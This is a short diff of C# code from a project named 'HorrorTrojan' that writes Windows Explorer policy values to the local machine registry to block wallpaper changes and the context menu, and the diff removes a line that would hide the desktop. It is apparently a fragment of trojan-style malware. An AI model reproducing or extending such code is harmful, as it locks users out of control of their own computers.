@@ -16,7 +16,6 @@ namespace HorrorTrojan
             using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
             {
                 key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
-                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
                 key.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
             }
             
